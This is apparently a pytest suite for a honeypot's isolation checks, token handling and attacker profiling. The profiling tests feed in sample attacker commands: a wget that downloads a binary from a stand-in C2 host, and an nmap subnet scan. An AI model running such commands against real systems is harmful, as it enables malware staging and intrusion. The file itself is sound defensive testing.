"""Isolation checks that each test what they are named for, and stay current.

Network segmentation and blocked egress used to be one probe of the public
internet reported under two names, and any exception from that probe counted
as "blocked". The startup result was then what every heartbeat reported for
the life of the process. No test here opens a socket: the probe is replaced.
"""

import asyncio
import errno
import socket
from unittest import mock

import pytest

from honeypot.adaptive.response import AdaptiveEngine
from honeypot.core.config import DEFAULT_INGEST_TOKEN, config
from honeypot.core.control_api import build_control_api
from honeypot.core.session import session_manager
from honeypot.security import breakout
from honeypot.security.breakout import BreakoutPrevention

HEADER = "Iface\tDestination\tGateway\tFlags\tRefCnt\tUse\tMetric\tMask\n"
INTERNAL_ONLY = HEADER + "eth0\t0043A8AC\t00000000\t0001\t0\t0\t0\t00FFFFFF\n"
# Default route via 172.30.66.1 (the gateway column is little-endian hex).
WITH_DEFAULT = INTERNAL_ONLY + "eth1\t00000000\t01421EAC\t0003\t0\t0\t0\t00000000\n"


def _segmentation(routes: str, probe):
    warnings: list[str] = []
    with mock.patch("builtins.open", mock.mock_open(read_data=routes)), mock.patch.object(
        BreakoutPrevention, "_probe", side_effect=probe
    ) as probed:
        ok = BreakoutPrevention._check_gateway_unreachable(warnings)
    return ok, warnings, probed


# -- the probe -----------------------------------------------------------------

@pytest.mark.parametrize(
    "raised,expected",
    [
        (None, "open"),
        (ConnectionRefusedError(), "refused"),
        (socket.timeout(), "blocked"),
        (OSError(errno.ENETUNREACH, "unreachable"), "blocked"),
        (OSError(errno.EHOSTUNREACH, "no route"), "blocked"),
        # Not a statement about the network at all, so not a pass.
        (OSError(errno.EMFILE, "too many open files"), "error"),
    ],
)
def test_probe_tells_a_dropped_packet_from_an_answer_from_a_local_error(raised, expected):
    connection = mock.MagicMock()
    with mock.patch.object(socket, "create_connection", side_effect=raised, return_value=connection):
        assert BreakoutPrevention._probe("192.0.2.1", 443) == expected


# -- segmentation: can the engine reach its host? --------------------------------

def test_no_default_route_is_segmented_without_probing():
    ok, warnings, probed = _segmentation(INTERNAL_ONLY, lambda *a, **k: "open")
    assert ok and not warnings
    probed.assert_not_called()


def test_a_gateway_that_drops_the_engine_is_segmented():
    ok, warnings, probed = _segmentation(WITH_DEFAULT, lambda *a, **k: "blocked")
    assert ok and not warnings
    # It asked the gateway, not the internet.
    assert {call.args[0] for call in probed.call_args_list} == {"172.30.66.1"}


@pytest.mark.parametrize("answer", ["open", "refused"])
def test_a_gateway_that_answers_is_not(answer):
    ok, warnings, _ = _segmentation(WITH_DEFAULT, lambda *a, **k: answer)
    assert not ok
    assert "172.30.66.1" in warnings[0] and "not segmented" in warnings[0]


def test_an_inconclusive_probe_does_not_pass():
    ok, warnings, _ = _segmentation(WITH_DEFAULT, lambda *a, **k: "error")
    assert not ok and "Could not determine" in warnings[0]


# -- egress ----------------------------------------------------------------------

@pytest.mark.parametrize(
    "results,expected",
    [
        (["blocked", "blocked", "blocked"], True),
        (["blocked", "open", "blocked"], False),
        # A refusal came back from the far end: the packet got out.
        (["refused", "blocked", "blocked"], False),
        (["error", "blocked", "blocked"], False),
    ],
)
def test_egress_is_blocked_only_when_every_probe_is_dropped(results, expected):
    warnings: list[str] = []
    with mock.patch.object(BreakoutPrevention, "_probe", side_effect=results):
        assert BreakoutPrevention._check_egress_blocked(warnings) is expected
    assert bool(warnings) is not expected


def test_the_two_checks_can_disagree(monkeypatch):
    """One probe used to answer both, so they could never differ."""
    monkeypatch.setattr(config, "enable_isolation", True)
    checker = BreakoutPrevention()
    checker._isolation_enabled = True

    def probe(host, port, timeout=1.0):
        return "refused" if host == "172.30.66.1" else "blocked"

    with mock.patch("builtins.open", mock.mock_open(read_data=WITH_DEFAULT)), \
            mock.patch.object(BreakoutPrevention, "_probe", side_effect=probe), \
            mock.patch.object(breakout.subprocess, "run", side_effect=FileNotFoundError), \
            mock.patch.object(BreakoutPrevention, "_check_read_only_rootfs", return_value=True), \
            mock.patch.object(BreakoutPrevention, "_check_privilege_restriction", return_value=True), \
            mock.patch.object(BreakoutPrevention, "_check_container_isolation", return_value=True):
        report = checker.verify_isolation()
    assert report["egress_blocked"] is True
    assert report["network_segmentation"] is False
    assert report["overall_secure"] is False


# -- the heartbeat reports the current state --------------------------------------

async def test_status_follows_a_later_check_not_the_startup_one(monkeypatch):
    from honeypot.main import HoneypotService

    answers = iter([
        {"overall_secure": False, "egress_blocked": False, "warnings": ["open"]},
        {"overall_secure": True, "egress_blocked": True, "warnings": []},
    ])
    checker = BreakoutPrevention()

    def sweep():
        report = breakout.IsolationReport(
            {"egress_blocked": next(answers)["egress_blocked"]}, [])
        checker._record(report)
        return report.to_dict()

    monkeypatch.setattr(checker, "verify_isolation", sweep)
    monkeypatch.setattr("honeypot.main.breakout_prevention", checker)
    service = HoneypotService()

    await service._check_isolation(startup=True)
    first = (await service.get_status())["isolation"]
    assert first["overall_secure"] is False
    await service._check_isolation()
    second = (await service.get_status())["isolation"]
    assert second["overall_secure"] is True
    assert second["checked_at"] >= first["checked_at"]
    assert second["total_checks"] == 2


def test_report_history_is_bounded():
    checker = BreakoutPrevention()
    for _ in range(breakout.MAX_REPORTS + 20):
        checker._record(breakout.IsolationReport({"egress_blocked": True}, []))
    assert len(checker._reports) == breakout.MAX_REPORTS


# -- configuration the engine refuses ---------------------------------------------

async def test_the_default_ingest_token_stops_the_engine_starting(monkeypatch):
    from honeypot.main import HoneypotService, InsecureConfiguration

    monkeypatch.setattr(config, "ingest_token", DEFAULT_INGEST_TOKEN)
    monkeypatch.setattr(config, "allow_default_token", False)
    service = HoneypotService()
    with pytest.raises(InsecureConfiguration):
        await service.start()
    assert service._bound == [] and service._running is False


async def test_the_override_lets_it_past_the_token_check(monkeypatch):
    from honeypot.main import HoneypotService

    monkeypatch.setattr(config, "ingest_token", DEFAULT_INGEST_TOKEN)
    monkeypatch.setattr(config, "allow_default_token", True)
    service = HoneypotService()

    class Reached(Exception):
        pass

    async def stop_here(startup=False):
        raise Reached

    # The next step after the token check; reaching it is the proof.
    monkeypatch.setattr(service, "_check_isolation", stop_here)
    with pytest.raises(Reached):
        await service.start()


# -- control token -----------------------------------------------------------------

async def _get(port: int, path: str, token: str) -> int:
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    writer.write(f"GET {path} HTTP/1.1\r\nHost: x\r\nX-Honeypot-Token: {token}\r\n\r\n".encode())
    await writer.drain()
    status = int((await asyncio.wait_for(reader.readline(), timeout=5)).split()[1])
    writer.close()
    return status


@pytest.mark.parametrize("control_token", ["", "separate-control-token"])
async def test_control_api_takes_the_control_token_when_one_is_set(monkeypatch, control_token):
    monkeypatch.setattr(config, "ingest_token", "the-ingest-token")
    monkeypatch.setattr(config, "control_token", control_token)
    monkeypatch.setattr(config, "control_bind_address", "127.0.0.1")
    monkeypatch.setattr(config, "control_port", 0)

    class Service:
        async def get_status(self):
            return {"running": True}

    api = build_control_api(Service())
    await api.start()
    port = api._server.sockets[0].getsockname()[1]
    try:
        if control_token:
            # Set: only the control token opens it, and the ingest token no longer does.
            assert await _get(port, "/status", control_token) == 200
            assert await _get(port, "/status", "the-ingest-token") == 401
        else:
            # Unset: the ingest token, as it always was.
            assert await _get(port, "/status", "the-ingest-token") == 200
        assert await _get(port, "/status", "wrong") == 401
    finally:
        await api.stop()


# -- actor profiling ----------------------------------------------------------------

async def test_c2_in_a_command_is_not_cobalt_strike(monkeypatch):
    monkeypatch.setattr(config, "adaptive_response", True)
    engine = AdaptiveEngine()
    session_id = await session_manager.create_session("ssh", "198.51.100.30", 40000)
    await engine.profile_actor(session_id, "198.51.100.30", {"command": "wget http://c2.example/Yzc2ZTI= -O c2bin"})
    profile = await engine.get_profile("198.51.100.30")
    assert "cobalt_strike" not in profile.tools_detected
    assert profile.actor_type.value != "apt"


async def test_the_switch_governs_profiling_and_the_label_reaches_the_payload(monkeypatch):
    engine = AdaptiveEngine()
    monkeypatch.setattr(config, "adaptive_response", False)
    off = await session_manager.create_session("ssh", "198.51.100.31", 40000)
    await engine.profile_actor(off, "198.51.100.31", {"command": "nmap -sV 10.0.0.0/24"})
    assert await engine.get_profile("198.51.100.31") is None
    assert "threat_profile" not in (await session_manager.get_session(off)).to_backend_payload(1)

    monkeypatch.setattr(config, "adaptive_response", True)
    on = await session_manager.create_session("ssh", "198.51.100.32", 40000)
    await engine.profile_actor(on, "198.51.100.32", {"command": "nmap -sV 10.0.0.0/24"})
    assert (await session_manager.get_session(on)).to_backend_payload(1)["threat_profile"] == "script_kiddie"
